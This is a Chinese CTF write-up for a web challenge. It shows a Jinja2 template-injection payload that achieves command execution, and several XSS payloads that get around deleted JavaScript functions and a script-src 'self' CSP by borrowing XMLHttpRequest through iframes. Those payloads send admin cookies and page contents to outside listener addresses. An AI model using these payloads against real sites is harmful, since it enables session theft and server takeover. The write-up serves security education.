> 原文链接: https://www.anquanke.com//post/id/220436 


# 中秋忆一道XSS题目


                                阅读量   
                                **166784**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t019dc3acf125dd1ccc.jpg)](https://p5.ssl.qhimg.com/t019dc3acf125dd1ccc.jpg)



国庆中秋期间闲的发呆，在整理之前做过的题目的时候，发现了一道当时被非预期的XSS题目，因为当时是被非预期所以拿到了root权限，本地完整的复现了当时的环境，整个题目解下来还是能学到一些知识的，如果不是被非预期感觉题目质量还是不错的。最后写成文章分享给大家，大佬们轻喷。



## 0x01 回忆题目功能

原题 ：湖湘杯 web Xmeo

### <a class="reference-link" name="0x1%20%E7%99%BB%E9%99%86%E6%B3%A8%E5%86%8C%E7%95%8C%E9%9D%A2"></a>0x1 登陆注册界面

简洁的登陆界面，拥有注册和登陆功能，注册时用户名不能重复。

[![](https://p0.ssl.qhimg.com/t012072d076cf1083fa.jpg)](https://p0.ssl.qhimg.com/t012072d076cf1083fa.jpg)

[![](https://p0.ssl.qhimg.com/t01acadafd981413768.jpg)](https://p0.ssl.qhimg.com/t01acadafd981413768.jpg)

### <a class="reference-link" name="0x2%20%E6%B7%BB%E5%8A%A0%E4%BF%AE%E6%94%B9%E6%9F%A5%E7%9C%8B%E6%8F%8F%E8%BF%B0"></a>0x2 添加修改查看描述

这里有个ADD按钮可以添加描述，但是必须选择否才能修改和查看这一点我也不知道是为什么。

[![](https://p1.ssl.qhimg.com/t0141fea8ceff018829.jpg)](https://p1.ssl.qhimg.com/t0141fea8ceff018829.jpg)

修改功能是重新弹出这个界面，然而查看界面则是直接将添加的描述信息打印出来。

### <a class="reference-link" name="0x3%20%E8%81%94%E7%B3%BB%E7%AE%A1%E7%90%86%E5%91%98"></a>0x3 联系管理员

按照要求填过所有的空之后会反回 `Submit successfully administrator will read it soon!` 从这个点也能看出来这是个标准的xss题目，但是当时已经拿到了flag，就没在纠结利用xss怎么解这道题目。

[![](https://p4.ssl.qhimg.com/t018320a52e045deea3.jpg)](https://p4.ssl.qhimg.com/t018320a52e045deea3.jpg)



## 0x02 非预期解

我们从非预期解开始回忆，当时拿到题目，发现能够查看添加的描述

[![](https://p5.ssl.qhimg.com/t0105a7032ad4612192.jpg)](https://p5.ssl.qhimg.com/t0105a7032ad4612192.jpg)

这时我们可以联想后台的代码逻辑

```
def show(args):
    ......
    return render_template_string(content)
```

因为 render_template_string 会渲染模板，将会解析`{``{``}``}`内的表达式，因此我们可以运用标准的python沙箱逃逸方法执行python 语句并实现任意命令执行

```
`{``{`''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')`}``}`
```

我们通过上述命令获取服务系统的root权限，如下图所示，

[![](https://p4.ssl.qhimg.com/t01de1166af15ac1197.jpg)](https://p4.ssl.qhimg.com/t01de1166af15ac1197.jpg)

下面进入本篇文章的主要内容，通过xss获取其中暗含的flag



## 0x03 利用XSS漏洞获取flag

### <a class="reference-link" name="0x1%20%E6%9A%97%E8%97%8F%E7%8E%84%E6%9C%BA"></a>0x1 暗藏玄机

如果不是非预期我还不知道这是道xss题目，通过查看进程了解到其中运行着phantomjs 进程执行着auto.js，auto.js中是标准的phantomjs 模拟浏览器访问，其中flag也在auto.js中包含着，利用模板注入拿flag也是通过该文件获取。

[![](https://p5.ssl.qhimg.com/t015572047e73c8f93d.jpg)](https://p5.ssl.qhimg.com/t015572047e73c8f93d.jpg)

发现这个之后我心里一直有个梗，想把它用正解解出来。

[![](https://p2.ssl.qhimg.com/t016a8567e921ad7ed4.png)](https://p2.ssl.qhimg.com/t016a8567e921ad7ed4.png)

### <a class="reference-link" name="0x2%20%E6%8F%AD%E5%BC%80%E9%9D%A2%E7%BA%B1"></a>0x2 揭开面纱

<a class="reference-link" name="1.%20js%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"></a>**1. js安全防护**

好了我开始在中秋佳节想着这个题目怎么做，一开始想着通过image标签等常见xss技巧获取管理员cookie，比如如下方法

```
var img = document.createElement("img");
img.src = "http://1.1.1.1/log?"+escape(document.cookie);
document.body.appendChild(img);
```

发现根本不好使，之后找到了罪魁祸首，在js中禁用了一些关键函数

[![](https://p0.ssl.qhimg.com/t0177350aabbffce64e.jpg)](https://p0.ssl.qhimg.com/t0177350aabbffce64e.jpg)

常见的XMLHttpRequest ，image标签等都被禁用了，回头来又发现了其他防护

<a class="reference-link" name="2.%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"></a>**2. 浏览器安全防护**

响应头中返回了`Content-Security-Policy: script-src 'self';`

[![](https://p0.ssl.qhimg.com/t012fb5df096c7d26b2.png)](https://p0.ssl.qhimg.com/t012fb5df096c7d26b2.png)

这就意味着该网站不允许内联脚本执行，也就是直接嵌套在`&lt;script&gt;&lt;/script&gt;`中的代码不被执行，而`&lt;script src="http://ip"&gt;&lt;/script&gt;` src中的代码将被执行，而且必须保证是同源网站。<br>
这个目的就很明显了，通过添加查看描述，可以在同源网站上添加任意javascript代码，这为之后的xss打下了基础。

### <a class="reference-link" name="0x3.%20%E6%9F%B3%E6%9A%97%E8%8A%B1%E6%98%8E"></a>0x3. 柳暗花明

尝试获取了当前页面的cookie

```
window['locat'+'ion'].href = "http://1.1.1.1/?"+document.cookie;
```

在向管理员提交留言时要注意，必须是127.0.0.1的ip，在复现的时候吃了一大亏，一直没成功，最后才发现时同源策略导致script代码没有执行。

```
&lt;/div&gt;
&lt;script src=http://127.0.0.1:7443/show/591b111c-096d-11eb-97c4-0242ac110003&gt;&lt;/script&gt;
&lt;div&gt;
```

[![](https://p3.ssl.qhimg.com/t01e0780c55aa2472ca.jpg)](https://p3.ssl.qhimg.com/t01e0780c55aa2472ca.jpg)

无意中获取到了一个hit 尝试获取/admin 中的页面内容，必须使用ajax的方法读取其中的网页内容

### <a class="reference-link" name="0x4.%20%E5%B1%82%E5%B1%82%E9%80%92%E8%BF%9B"></a>0x4. 层层递进

既然有这么多防护，那么就想办法去绕过禁用了img和XMLHttpRequest，<br>
这个其实在之前的ctf题目中有出现过比较常见的绕过方法是，利用iframe子窗口中的函数。

```
var ifm = document.createElement('iframe');
ifm.setAttribute('src','/admin/');
document.body.appendChild(ifm);
window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest;
var xhr = new XMLHttpRequest();xhr.open("GET", "http://127.0.0.1:7443/admin/",false);
xhr.send();
c=xhr.responseText;
window.location.href="http://192.168.0.134:8889/?c="+c;
```

利用js代码创建iframe 标签设置其中的网页url，利用iframe中的XMLHttpRequest 发送请求给admin 页面并获取页面内容通过location.href 发送至服务器。注意这里的后台请求url为 `http://127.0.0.1:7443/admin/` 一定要带/因为flask强制识别<br>
因为片段太长所以通过如下方法进行绕过

[![](https://p5.ssl.qhimg.com/t0191f9bae85738558c.jpg)](https://p5.ssl.qhimg.com/t0191f9bae85738558c.jpg)

[![](https://p0.ssl.qhimg.com/t01fc81ca20ef5f83dd.jpg)](https://p0.ssl.qhimg.com/t01fc81ca20ef5f83dd.jpg)

[![](https://p2.ssl.qhimg.com/t01fcae1444d73128b1.jpg)](https://p2.ssl.qhimg.com/t01fcae1444d73128b1.jpg)

获取了新的hint

```
This website also have another page named mysecrecy_directory......
```

## 0x5. 终极之战

这个目的就很清楚了获取mysecrecy_directory目录下的cookie即可

```
var f= document.createElement('iframe');
f.setAttribute('src','/admin/mysecrecy_directory');
document.body.appendChild(f);
f.onload = function()`{`
var a= f.contentWindow.document.cookie;
location.href = "http://192.168.0.134:8889/?"+a;`}`
```

和之前一样，修改src为/admin/mysecrecy_directory，在iframe加载的同时获取iframe中的cookie并利用href跳转获取flag

[![](https://p5.ssl.qhimg.com/t0199abfb579f056aac.jpg)](https://p5.ssl.qhimg.com/t0199abfb579f056aac.jpg)



## 0x04 总结

总算是了结了心结，同时总结了xss的绕过技巧，绕过js delete禁用、绕过csp安全策略、利用xss从127.0.0.1访问网站并获取内容，利用xss读取当前网站任意url cookie等技术，这个十一收获还是有的。
